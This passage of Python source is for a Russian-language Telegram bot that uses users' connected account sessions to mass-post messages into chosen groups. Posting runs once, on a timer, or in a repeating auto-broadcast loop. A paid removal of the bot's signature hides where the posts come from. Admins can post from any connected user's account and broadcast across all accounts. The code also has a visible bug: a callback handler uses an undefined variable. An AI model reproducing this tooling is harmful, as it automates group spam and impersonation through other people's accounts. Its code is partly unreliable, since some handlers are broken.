    except Exception as exc:
        log.exception("Group refresh failed")
        await message.answer(f"Не удалось загрузить группы: {type(exc).__name__}: {exc}")

@dp.message(F.text == "📨 Рассылка")
async def broadcast_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "broadcast_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    groups = await db.selected_groups(message.from_user.id)
    if not groups:
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.broadcast_text)
    await message.answer(f"Отправьте текст сообщения. Оно будет отправлено в {len(groups)} выбранных групп. Интервал: {user['delay_seconds']} сек.")

@dp.message(TextFlow.broadcast_text)
async def broadcast_text(message: Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer("Сообщение пустое. Отправьте текст.")
        return
    user_id = message.from_user.id
    await state.clear()
    old = campaign_tasks.get(user_id)
    if old and not old.done():
        await message.answer("Рассылка уже выполняется. Сначала остановите её.")
        return
    task = asyncio.create_task(run_campaign(user_id, text, message.chat.id))
    campaign_tasks[user_id] = task
    await message.answer("Рассылка запущена. Если Telegram применит ограничение, рассылка остановится.")

async def run_campaign(user_id: int, text: str, chat_id: int):
    try:
        result = await sender.send_campaign(user_id, text)
        msg = f"Рассылка завершена.\nОтправлено: {result['sent']}\nОшибок: {result['failed']}"
        if result["stopped"]:
            msg += "\n⚠️ Telegram применил ограничение или медленный режим. Рассылка остановлена."
        if result.get("errors"):
            msg += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, msg)
    except Exception as exc:
        log.exception("Campaign failed")
        await bot.send_message(chat_id, f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    finally:
        campaign_tasks.pop(user_id, None)

@dp.message(F.text == "🛑 Остановить рассылку")
async def stop_campaign(message: Message):
    task = campaign_tasks.get(message.from_user.id)
    if task and not task.done():
        task.cancel()
        await message.answer("Запрос на остановку отправлен.")
    else:
        await message.answer("Активной рассылки нет.")
    timer = timer_tasks.get(message.from_user.id)
    if timer and not timer.done():
        timer.cancel()
        await message.answer("Таймер также остановлен.")
    auto = auto_tasks.get(message.from_user.id)
    if auto and not auto.done():
        auto.cancel()
        await message.answer("Авторассылка также остановлена.")

AUTO_INTERVALS = (120, 180, 300, 600, 900, 1200)  # 2, 3, 5, 10, 15, 20 minutes
AUTO_INTERVAL_LABELS = {120: "2 мин", 180: "3 мин", 300: "5 мин", 600: "10 мин", 900: "15 мин", 1200: "20 мин"}


async def get_auto_interval(user_id: int) -> int:
    """Read and cache the per-user auto-broadcast interval, defaulting to 5 minutes."""
    cached = auto_intervals.get(user_id)
    if cached in AUTO_INTERVALS:
        return cached
    try:
        async with db.get_pool().acquire() as con:
            value = await con.fetchval("SELECT value FROM settings WHERE key=$1", f"auto_interval:{user_id}")
        seconds = int(value) if value is not None else 300
    except (TypeError, ValueError):
        seconds = 300
    except Exception:
        log.exception("Could not load auto-broadcast interval for user %s", user_id)
        seconds = 300
    if seconds not in AUTO_INTERVALS:
        seconds = 300
    auto_intervals[user_id] = seconds
    return seconds


async def save_auto_interval(user_id: int, seconds: int) -> None:
    if seconds not in AUTO_INTERVALS:
        raise ValueError("Недопустимый интервал авторассылки")
    async with db.get_pool().acquire() as con:
        await con.execute(
            "INSERT INTO settings(key, value) VALUES($1, $2) "
            "ON CONFLICT(key) DO UPDATE SET value=EXCLUDED.value",
            f"auto_interval:{user_id}", str(seconds),
        )
    auto_intervals[user_id] = seconds


def auto_keyboard(user_id: int, seconds: int | None = None):
    seconds = seconds or auto_intervals.get(user_id, 300)
    running = user_id in auto_tasks and not auto_tasks[user_id].done()
    action = (InlineKeyboardButton(text="⏹ Остановить", callback_data="auto:stop")
              if running else InlineKeyboardButton(text="▶️ Запустить", callback_data="auto:begin"))
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏱ Интервал: {AUTO_INTERVAL_LABELS.get(seconds, '5 мин')}", callback_data="auto:interval")],
        [action],
        [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
    ])


async def auto_panel_text(user_id: int) -> str:
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    seconds = await get_auto_interval(user_id)
    running = user_id in auto_tasks and not auto_tasks[user_id].done()
    status = "🟢 Включена" if running else "🔴 Отключена"
    account = "✅ Подключён" if user and user["session_string"] else "❌ Не подключён"
    return (
        "🤖 <b>ПАНЕЛЬ АВТОРАССЫЛКИ</b>\n\n"
        f"📊 <b>Статус:</b> {status}\n"
        f"👤 <b>Аккаунт:</b> {account}\n"
        f"👥 <b>Выбрано групп:</b> {len(groups)}\n"
        f"⏱ <b>Интервал:</b> {AUTO_INTERVAL_LABELS[seconds]}\n\n"
        "📨 Сообщение отправляется только в выбранные группы.\n"
        "ℹ️ Интервал отсчитывается после завершения одного полного цикла.\n"
        "⚠️ При ограничении Telegram рассылка остановится автоматически."
    )


async def edit_auto_panel(chat_id: int, message_id: int, user_id: int) -> None:
    text = await auto_panel_text(user_id)
    seconds = await get_auto_interval(user_id)
    with suppress(TelegramBadRequest):
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=auto_keyboard(user_id, seconds),
            parse_mode="HTML",
        )


async def refresh_auto_panel(user_id: int) -> None:
    ref = auto_panel_refs.get(user_id)
    if not ref:
        return
    chat_id, message_id = ref
    try:
        await edit_auto_panel(chat_id, message_id, user_id)
    except Exception:
        log.exception("Could not refresh auto-broadcast panel for user %s", user_id)


async def auto_menu(message: Message):
    user_id = message.from_user.id
    await require_user(message)
    seconds = await get_auto_interval(user_id)
    sent = await message.answer(
        await auto_panel_text(user_id),
        reply_markup=auto_keyboard(user_id, seconds),
        parse_mode="HTML",
    )
    auto_panel_refs[user_id] = (sent.chat.id, sent.message_id)


@dp.callback_query(F.data == "auto:interval")
async def auto_interval_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    rows = [
        [InlineKeyboardButton(text="2 мин", callback_data="auto:set:120"),
         InlineKeyboardButton(text="3 мин", callback_data="auto:set:180")],
        [InlineKeyboardButton(text="5 мин", callback_data="auto:set:300"),
         InlineKeyboardButton(text="10 мин", callback_data="auto:set:600")],
        [InlineKeyboardButton(text="15 мин", callback_data="auto:set:900"),
         InlineKeyboardButton(text="20 мин", callback_data="auto:set:1200")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="auto:back"),
         InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
    ]
    await callback.message.edit_text(
        "⏱ <b>Интервал авторассылки</b>\n\nВыберите интервал от 2 до 20 минут. Он применяется после завершения отправки во все выбранные группы.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("auto:set:"))
async def auto_set_interval(callback: CallbackQuery):
    try:
        seconds = int(callback.data.rsplit(":", 1)[1])
    except (TypeError, ValueError):
        await callback.answer("Некорректный интервал", show_alert=True)
        return
    if seconds not in AUTO_INTERVALS:
        await callback.answer("Выберите интервал от 2 до 20 минут", show_alert=True)
        return
    try:
        await save_auto_interval(callback.from_user.id, seconds)
    except Exception as exc:
        log.exception("Could not save auto-broadcast interval")
        await callback.answer(f"Не удалось сохранить: {type(exc).__name__}", show_alert=True)
        return
    if callback.message:
        auto_panel_refs[callback.from_user.id] = (callback.message.chat.id, callback.message.message_id)
        await edit_auto_panel(callback.message.chat.id, callback.message.message_id, callback.from_user.id)
    await callback.answer(f"Интервал сохранён: {AUTO_INTERVAL_LABELS[seconds]}")


@dp.callback_query(F.data == "auto:back")
async def auto_back(callback: CallbackQuery):
    if callback.message:
        auto_panel_refs[callback.from_user.id] = (callback.message.chat.id, callback.message.message_id)
        await edit_auto_panel(callback.message.chat.id, callback.message.message_id, callback.from_user.id)
    await callback.answer()


@dp.callback_query(F.data == "auto:status")
async def auto_status(callback: CallbackQuery):
    await callback.answer("Авторассылка уже работает")
    await refresh_auto_panel(callback.from_user.id)


@dp.callback_query(F.data == "auto:begin")
async def auto_begin(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    if not user or not user["session_string"]:
        await callback.answer("Сначала подключите аккаунт Telegram", show_alert=True)
        return
    if not groups:
        await callback.answer("Сначала выберите группы и сохраните выбор", show_alert=True)
        return
    old = auto_tasks.get(user_id)
    if old and not old.done():
        await callback.answer("Авторассылка уже работает", show_alert=True)
        await refresh_auto_panel(user_id)
        return
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    await state.clear()
    await state.set_state(TextFlow.auto_text)
    if callback.message:
        await state.update_data(auto_panel_chat_id=callback.message.chat.id,
                                auto_panel_message_id=callback.message.message_id)
    await callback.message.answer(
        "✍️ <b>Отправьте текст для авторассылки.</b>\n\n"
        "Сообщение будет регулярно отправляться в выбранные группы.\n"
        "Для отмены нажмите «❌ Закрыть действие» или отправьте /cancel.",
        reply_markup=await main_keyboard(await admin_check(message.from_user.id)), parse_mode="HTML")
    await callback.answer()


@dp.message(TextFlow.auto_text)
async def auto_text(message: Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer("⚠️ Отправьте непустой текст или отмените действие кнопкой «❌ Закрыть действие».")
        return
    user_id = message.from_user.id
    state_data = await state.get_data()
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    if not user or not user["session_string"] or not groups:
        await state.clear()
        await message.answer("❌ Не удалось запустить. Проверьте подключение аккаунта и выбранные группы.", reply_markup=await main_keyboard(await admin_check(message.from_user.id)))
        await refresh_auto_panel(user_id)
        return
    old = auto_tasks.get(user_id)
    if old and old.done():
        auto_tasks.pop(user_id, None)
        old = None
    if old and not old.cancelling() and not old.cancelled():
        await state.clear()
        await message.answer("⚠️ Авторассылка ещё выполняется. Нажмите «⏹ Стоп авторассылки» и дождитесь подтверждения.", reply_markup=await main_keyboard(await admin_check(user_id)))
        await refresh_auto_panel(user_id)
        return
    if old and (old.cancelling() or old.cancelled()):
        await cancel_task_and_wait(auto_tasks, user_id)
    await state.clear()
    try:
        await db.save_auto_campaign(user_id, text, message.chat.id)
    except Exception as exc:
        log.exception("Could not persist auto-broadcast campaign for user %s", user_id)
        await message.answer(
            f"❌ Не удалось сохранить авторассылку: {html.escape(type(exc).__name__)}. Попробуйте ещё раз.",
            reply_markup=await main_keyboard(await admin_check(message.from_user.id)),
            parse_mode="HTML",
        )
        await refresh_auto_panel(user_id)
        return
    seconds = await get_auto_interval(user_id)
    auto_tasks[user_id] = asyncio.create_task(run_auto_campaign(user_id, text, message.chat.id))
    await message.answer(
        f"🟢 <b>Авторассылка запущена!</b>\nИнтервал между циклами: {AUTO_INTERVAL_LABELS[seconds]}.\n"
        "Для остановки нажмите «⏹ Стоп авторассылки» или кнопку остановки в панели.",
        reply_markup=await main_keyboard(await admin_check(message.from_user.id)), parse_mode="HTML")
    panel_chat_id = state_data.get("auto_panel_chat_id")
    panel_message_id = state_data.get("auto_panel_message_id")
    if panel_chat_id and panel_message_id:
        auto_panel_refs[user_id] = (int(panel_chat_id), int(panel_message_id))
    await refresh_auto_panel(user_id)


async def run_auto_campaign(user_id: int, text: str, chat_id: int):
    """Run recurring cycles until stopped; recoverable errors are logged and retried."""
    log.info("Auto-broadcast task started for user %s", user_id)
    try:
        while True:
            try:
                log.info("Auto-broadcast cycle starting for user %s", user_id)
                result = await sender.send_campaign(user_id, text, delay_seconds=0)
                msg = ("🤖 <b>Цикл авторассылки завершён</b>\n"
                       f"✅ Отправлено: {result['sent']}\n"
                       f"⚠️ Ошибок: {result['failed']}")
                if result.get("errors"):
                    msg += "\n\n" + "\n".join(f"• {html.escape(str(e))}" for e in result["errors"][:5])
                log.info(
                    "Auto-broadcast cycle completed for user %s: sent=%s failed=%s; next cycle after configured interval",
                    user_id, result.get("sent", 0), result.get("failed", 0),
                )
                with suppress(Exception):
                    await bot.send_message(chat_id, msg, parse_mode="HTML")
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                # Keep the campaign enabled after transient DB/network/session failures.
                log.exception("Auto-broadcast cycle failed for user %s; retrying after interval", user_id)
                with suppress(Exception):
                    await bot.send_message(
                        chat_id,
                        f"⚠️ Цикл авторассылки завершился с ошибкой: {html.escape(type(exc).__name__)}. Повторю через выбранный интервал.",
                        parse_mode="HTML",
                    )
            interval = await get_auto_interval(user_id)
            log.info("Auto-broadcast user %s sleeping %s seconds before next cycle", user_id, interval)
            await asyncio.sleep(interval)
    except asyncio.CancelledError:
        if not shutting_down:
            with suppress(Exception):
                await bot.send_message(chat_id, "⏹ Авторассылка остановлена.")
        else:
            log.info("Auto-broadcast for user %s paused for process shutdown; persisted as enabled", user_id)
        raise
    except Exception as exc:
        log.exception("Auto-broadcast task failed permanently for user %s", user_id)
        with suppress(Exception):
            await db.disable_auto_campaign(user_id)
        with suppress(Exception):
            await bot.send_message(chat_id, f"❌ Авторассылка остановлена из-за критической ошибки: {html.escape(type(exc).__name__)}.")
    finally:
        current = auto_tasks.get(user_id)
        if current is asyncio.current_task():
            auto_tasks.pop(user_id, None)
        if not shutting_down:
            with suppress(Exception):
                await db.disable_auto_campaign(user_id)
        with suppress(Exception):
            await refresh_auto_panel(user_id)


async def cancel_task_and_wait(task_map: dict[int, asyncio.Task], user_id: int) -> bool:
    """Cancel a task and wait for cleanup before allowing a replacement campaign."""
    task = task_map.get(user_id)
    if task is None or task.done():
        if task_map.get(user_id) is task:
            task_map.pop(user_id, None)
        return False
    task.cancel()
    try:
        await asyncio.wait_for(asyncio.gather(task, return_exceptions=True), timeout=10)
    except asyncio.TimeoutError:
        log.warning("Task cancellation timed out for user %s", user_id)
    if task_map.get(user_id) is task:
        task_map.pop(user_id, None)
    return True


@dp.callback_query(F.data == "auto:stop")
async def auto_stop_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    stopped = await cancel_task_and_wait(auto_tasks, user_id)
    with suppress(Exception):
        await db.disable_auto_campaign(user_id)
    await callback.answer("Авторассылка остановлена" if stopped else "Авторассылка уже отключена")
    await refresh_auto_panel(user_id)


async def stop_auto(message: Message):
    user_id = message.from_user.id
    stopped = await cancel_task_and_wait(auto_tasks, user_id)
    with suppress(Exception):
        await db.disable_auto_campaign(user_id)
    text = "⏹ Авторассылка остановлена. Теперь можно задать новый текст." if stopped else "🔴 Авторассылка отключена. Теперь можно задать новый текст."
    await message.answer(text, reply_markup=await main_keyboard(await admin_check(user_id)))
    await refresh_auto_panel(user_id)


@dp.message(F.text == "⏳ Интервал")
async def delay_menu(message: Message):
    user = await require_user(message)
    kb = with_close([
        [InlineKeyboardButton(text="2 мин", callback_data="delay:120"),
         InlineKeyboardButton(text="3 мин", callback_data="delay:180"),
         InlineKeyboardButton(text="5 мин", callback_data="delay:300")],
        [InlineKeyboardButton(text="10 мин", callback_data="delay:600"),
         InlineKeyboardButton(text="15 мин", callback_data="delay:900"),
         InlineKeyboardButton(text="20 мин", callback_data="delay:1200")],
    ])
    await message.answer(f"Текущий интервал: {user['delay_seconds']//60} мин.\n⚠️ Слишком маленький интервал может привести к ограничениям аккаунта.", reply_markup=kb)

@dp.callback_query(F.data.startswith("delay:"))
async def set_delay_callback(callback: CallbackQuery):
    delay = int(callback.data.split(":")[1])
    if delay < config.min_delay or delay > config.max_delay:
        await callback.answer("Интервал вне допустимого диапазона.", show_alert=True)
        return
    await db.set_delay(callback.from_user.id, delay)
    await callback.answer(f"Интервал: {delay//60} мин")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "✍️ Подпись")
async def signature_menu(message: Message):
    user = await require_user(message)
    enabled = user["signature_enabled"]
    if enabled:
        kb = with_close([[InlineKeyboardButton(text="⭐ Отключить подпись", callback_data="signature:off")]])
        await message.answer("Подпись включена:\nотправлено через @jingizbot", reply_markup=kb)
    else:
        kb = with_close([[InlineKeyboardButton(text="✅ Включить подпись", callback_data="signature:on")]])
        await message.answer("Подпись выключена.", reply_markup=kb)

@dp.callback_query(F.data.startswith("signature:"))
async def signature_toggle(callback: CallbackQuery):
    enabled = callback.data.endswith("on")
    if not enabled and not await charge_if_needed(callback.from_user.id, "unsign_price"):
        await callback.answer("Недостаточно звёзд.", show_alert=True)
        return
    await db.set_signature(callback.from_user.id, enabled)
    await callback.answer("Подпись включена" if enabled else "Подпись отключена")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(F.text == "⭐ Мои звёзды")
async def my_stars(message: Message):
    user = await require_user(message)
    await message.answer(f"⭐ Ваш баланс: {user['stars']} звёзд")

@dp.message(F.text == "⏱ Рассылка по таймеру")
async def timer_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "timer_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    if not await db.selected_groups(message.from_user.id):
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.timer_text)
    await message.answer("Отправьте текст рассылки.")

@dp.message(TextFlow.timer_text)
async def timer_text(message: Message, state: FSMContext):
    await state.update_data(timer_text=(message.text or "").strip())
    await state.set_state(TextFlow.timer_datetime)
    await message.answer("Укажите время запуска в формате YYYY-MM-DD HH:MM (UTC), например 2026-12-31 18:30.")

@dp.message(TextFlow.timer_datetime)
async def timer_datetime(message: Message, state: FSMContext):
    try:
        run_at = datetime.strptime((message.text or "").strip(), "%Y-%m-%d %H:%M").replace(tzinfo=timezone.utc)
    except ValueError:
        await message.answer("Неверный формат. Пример: 2026-12-31 18:30")
        return
    if run_at <= datetime.now(timezone.utc):
        await message.answer("Время должно быть в будущем.")
        return
    data = await state.get_data()
    text = data.get("timer_text", "")
    await state.clear()
    task_id = await db.create_task(message.from_user.id, "timer", text, run_at)
    previous = timer_tasks.get(message.from_user.id)
    if previous and not previous.done():
        previous.cancel()
    timer_tasks[message.from_user.id] = asyncio.create_task(run_timer(message.from_user.id, task_id, text, run_at, message.chat.id))
    await message.answer(f"⏱ Таймер №{task_id} сохранён. Запуск: {run_at.strftime('%Y-%m-%d %H:%M UTC')}")

async def run_timer(user_id: int, task_id: int, text: str, run_at: datetime, chat_id: int):
    try:
        delay = max(0, (run_at - datetime.now(timezone.utc)).total_seconds())
        await asyncio.sleep(delay)
        await db.update_task(task_id, "running")
        result = await sender.send_campaign(user_id, text)
        status = "completed" if not result["stopped"] else "stopped"
        await db.update_task(task_id, status, result)
        report = f"Таймер №{task_id} завершён.\nОтправлено: {result['sent']}; ошибок: {result['failed']}."
        if result.get("errors"):
            report += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, report)
    except asyncio.CancelledError:
        await db.update_task(task_id, "cancelled")
        raise
    except Exception as exc:
        log.exception("Timer failed")
        await db.update_task(task_id, "failed", {"error": str(exc)})
        await bot.send_message(chat_id, f"Таймер #{task_id} завершился с ошибкой: {type(exc).__name__}.")
    finally:
        timer_tasks.pop(user_id, None)

@dp.message(F.text == "📋 Мои задачи")
async def my_tasks(message: Message):
    tasks = await db.list_tasks(message.from_user.id)
    if not tasks:
        await message.answer("Задач пока нет.")
        return
    type_names = {"timer": "Таймер", "broadcast": "Рассылка"}
    status_names = {"pending": "Ожидает", "running": "Выполняется", "completed": "Завершена", "stopped": "Остановлена", "cancelled": "Отменена", "failed": "Ошибка"}
    lines = [f"№{t['id']} · {type_names.get(t['task_type'], t['task_type'])} · {status_names.get(t['status'], t['status'])} · {t['created_at'].strftime('%Y-%m-%d %H:%M')}" for t in tasks[:30]]
    await message.answer("\n".join(lines))

# Панель администратора: все действия администратора бесплатны; цены применяются только к обычным пользователям.
async def show_users_page(message: Message, page: int):
    users = await db.list_users()
    page_size = 10
    pages = max(1, (len(users) + page_size - 1) // page_size)
    page = max(0, min(page, pages - 1))
    chunk = users[page * page_size:(page + 1) * page_size]
    if not chunk:
        await message.answer("Список пользователей пуст.")
        return
    lines = [f"👥 <b>Пользователи</b> · всего: {len(users)} · страница {page + 1}/{pages}", ""]
    for u in chunk:
        username = f"@{u['username']}" if u["username"] else "без username"
        connected = "🟢 подключён" if u["connected"] else "⚪ не подключён"
        safe_name = html.escape(str(u['full_name'] or 'Без имени'))
        safe_username = html.escape(username)
        lines.append(f"• <b>{safe_name}</b>\n  ID: <code>{u['user_id']}</code> · {safe_username}\n  ⭐ {u['stars']} · {connected}")
    rows = []
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users:{page-1}"))
    if page + 1 < pages:
        nav.append(InlineKeyboardButton(text="Вперёд ➡️", callback_data=f"users:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔄 Обновить", callback_data=f"users:{page}")])
    await message.answer("\n".join(lines), parse_mode="HTML", reply_markup=with_close(rows))

@dp.callback_query(F.data.startswith("users:"))
async def users_page_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    page = int(callback.data.split(":", 1)[1])
    await show_users_page(callback.message, page)
    await callback.answer()

@dp.callback_query(F.data.startswith("adm:"))
async def admin_actions(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    action = callback.data.split(":", 1)[1]
    await callback.answer()
    if action == "add_user":
        await state.set_state(AdminFlow.add_user)
        await callback.message.answer("Отправьте Telegram ID пользователя.")
    elif action == "add_admin":
        await state.set_state(AdminFlow.add_admin)
        await callback.message.answer("Отправьте Telegram ID нового администратора.")
    elif action == "admins":
        rows, supers = await db.list_admins(config.super_admins)
        text = "👑 Суперадминистраторы:\n" + ("\n".join(map(str, supers)) or "—")
        text += "\n\nДополнительные администраторы:\n" + ("\n".join(str(r["user_id"]) for r in rows) or "—")
        await callback.message.answer(text)
    elif action == "stars":
        await state.set_state(AdminFlow.give_stars)
        await callback.message.answer("Отправьте ID пользователя и количество звёзд в одной строке: ID 100")
    elif action == "prices":
        prices = [f"{key} = {await db.get_price(key)} ⭐" for key in PRICE_KEYS]
        kb = with_close([
            [InlineKeyboardButton(text=f"{label}: {await db.get_price(key)} ⭐", callback_data=f"price:{key}")]
            for key, label in PRICE_KEYS.items()
        ])
        await callback.message.answer("Нажмите на цену, чтобы изменить её:\n" + "\n".join(prices), reply_markup=kb)
    elif action == "add_channel":
        await state.set_state(AdminFlow.force_sub)
        await callback.message.answer(
            "➕ <b>Добавить канал для обязательной подписки</b>\n\n"
            "Отправьте @username или ID канала. Для приватного канала укажите ID и ссылку-приглашение через символ |\n"
            "Пример публичного: @mychannel\nПример приватного: -1001234567890 | https://t.me/+AbCdEf123\n\n"
            "Бот должен быть администратором канала, чтобы проверять подписку.",
            parse_mode="HTML")
    elif action == "subs":
        subs = await db.list_force_subs()
        kb = with_close([
            [InlineKeyboardButton(text=f"🗑 №{s['id']} {s['label'] or s['chat_ref']}", callback_data=f"subdel:{s['id']}")]
            for s in subs
        ] + [[InlineKeyboardButton(text="➕ Добавить канал", callback_data="adm:add_channel")]])
        await callback.message.answer(
            "📢 <b>Обязательная подписка</b>\nПользователь должен подписаться на каждый канал из списка. "
            "Бот должен быть администратором канала. Нажмите на канал, чтобы удалить его из списка.",
            reply_markup=kb, parse_mode="HTML")
    elif action == "user_broadcast":
        await state.set_state(AdminFlow.admin_user_broadcast_id)
        await callback.message.answer("Отправьте ID пользователя, от имени подключённого аккаунта которого нужно отправить сообщение.")
    elif action == "global_broadcast":
        await state.set_state(AdminFlow.global_broadcast_text)
        await callback.message.answer("Отправьте текст общей рассылки. Он будет отправлен в выбранные группы каждого подключённого аккаунта.")
    elif action == "csv":
        users = await db.list_users()
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["user_id", "username", "full_name", "stars", "connected", "created_at"])
        for u in users:
            writer.writerow([u["user_id"], u["username"], u["full_name"], u["stars"], u["connected"], u["created_at"]])
        await callback.message.answer_document(BufferedInputFile(buf.getvalue().encode("utf-8-sig"), filename="jingizbot_users.csv"))
    elif action == "users":
        await show_users_page(callback.message, 0)
    elif action == "stats":
        s = await db.stats()
        await callback.message.answer(
            f"📊 Статистика\nПользователи: {s['users']}\nПодключённые аккаунты: {s['connected']}\nГруппы: {s['groups']}\nОжидающие задачи: {s['tasks_pending']}\nДополнительные администраторы: {s['admins']}"
        )
    elif action == "refresh_user":
        await state.set_state(AdminFlow.refresh_user)
        await callback.message.answer("Отправьте ID пользователя для просмотра его данных.")
    elif action == "remove_admin":
        await state.set_state(AdminFlow.remove_admin)
        await callback.message.answer("Отправьте ID администратора для удаления. Суперадминистратора нельзя удалить этим способом.")

@dp.callback_query(F.data.startswith("price:"))
async def price_select(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    key = callback.data.split(":", 1)[1]
    if key not in PRICE_KEYS:
        await callback.answer("Цена не найдена.", show_alert=True)
        return
    await state.update_data(price_key=key)
    await state.set_state(AdminFlow.price_value)
    await callback.message.answer(f"Отправьте новую цену для «{PRICE_KEYS[key]}» в звёздах. 0 = бесплатно.")
    await callback.answer()

@dp.callback_query(F.data == "subadd")
async def subadd_callback(callback: CallbackQuery, state: FSMContext):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await state.set_state(AdminFlow.force_sub)
    await callback.message.answer("Отправьте username или ID канала/группы (например, @mychannel). Для кнопки подписки лучше использовать публичный username или ссылку.")
    await callback.answer()

@dp.callback_query(F.data.startswith("subdel:"))
async def subdel_callback(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён.", show_alert=True)
        return
    await db.delete_force_sub(int(callback.data.split(":")[1]))
    await callback.answer("Удалено")
    await callback.message.edit_reply_markup(reply_markup=None)

@dp.message(AdminFlow.add_user)
async def admin_add_user(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.upsert_user(user_id, None, "")
        await db.log_admin_action(message.from_user.id, "add_user", user_id)
        await message.answer(f"Пользователь {user_id} добавлен.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.add_admin)
async def admin_add_admin(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        user_id = int((message.text or "").strip())
        await db.add_admin(user_id, message.from_user.id)
        await db.log_admin_action(message.from_user.id, "add_admin", user_id)
        await message.answer(f"Пользователь {user_id} назначен администратором.")
    except Exception as exc:
        await message.answer(f"Неверный ID или ошибка базы данных: {exc}")
    await state.clear()

@dp.message(AdminFlow.give_stars)
async def admin_give_stars(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    try:
        parts = (message.text or "").split()
        user_id, amount = int(parts[0]), int(parts[1])
        if amount <= 0:
            raise ValueError("Количество должно быть положительным.")
        balance = await db.add_stars(user_id, amount)
        await db.log_admin_action(message.from_user.id, "give_stars", user_id, {"amount": amount})
        await message.answer(f"Пользователю {user_id} {amount} звёзд начислено. Баланс: {balance}")
    except Exception as exc:
        await message.answer(f"Формат: ID 100. Ошибка: {exc}")
    await state.clear()

@dp.message(AdminFlow.price_value)
async def admin_price_value(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    data = await state.get_data()
    try:
        amount = int((message.text or "").strip())
        if amount < 0:
            raise ValueError("Цена не может быть отрицательной.")
        await db.set_price(data["price_key"], amount)
        await message.answer(f"Цена обновлена: {PRICE_KEYS[data['price_key']]} = {amount} ⭐. Для администраторов все функции остаются бесплатными.")
    except Exception as exc:
        await message.answer(f"Цена должна быть числом от 0 и выше: {exc}")
    await state.clear()

@dp.message(AdminFlow.force_sub)
async def admin_force_sub(message: Message, state: FSMContext):
    if not await admin_check(message.from_user.id):
        await state.clear(); return
    raw = (message.text or "").strip()
    if not raw:
        await message.answer("Отправьте @username или ID канала.")
        return
    pieces = [part.strip() for part in raw.split("|", 1)]
    ref = pieces[0]
    invite_url = pieces[1] if len(pieces) > 1 else None
    if ref.startswith("https://t.me/"):
        slug = ref.removeprefix("https://t.me/").strip("/")
        if slug and not slug.startswith(("+", "joinchat/")):
            ref = "@" + slug.split("/", 1)[0].lstrip("@")
        elif not invite_url:
            invite_url = ref
    if invite_url and not invite_url.startswith(("https://t.me/", "http://t.me/")):
        await message.answer("Ссылка приглашения должна начинаться с https://t.me/ .")
        return
    if not (ref.startswith("@") or ref.lstrip("-").isdigit()):
        await message.answer("Неверный формат. Пример: @mychannel или -1001234567890 | https://t.me/+InviteCode")
        return
    try:
        chat = await bot.get_chat(ref)
        bot_me = await bot.get_me()
        bot_member = await bot.get_chat_member(chat.id, bot_me.id)
        if bot_member.status not in ("administrator", "creator"):
            await message.answer("❌ Сначала добавьте бота в канал администратором, затем повторите попытку.")
            return
        label = getattr(chat, "title", None) or ref
        await db.add_force_sub(ref, label, invite_url)
        await db.log_admin_action(message.from_user.id, "force_sub_add", None, {"chat_ref": ref, "invite_url": invite_url})
        await message.answer(f"✅ Канал добавлен в обязательную подписку: {label}\nПроверка подписки включена для новых пользователей.")
    except Exception as exc:
        log.exception("Failed to add mandatory subscription channel %s", ref)
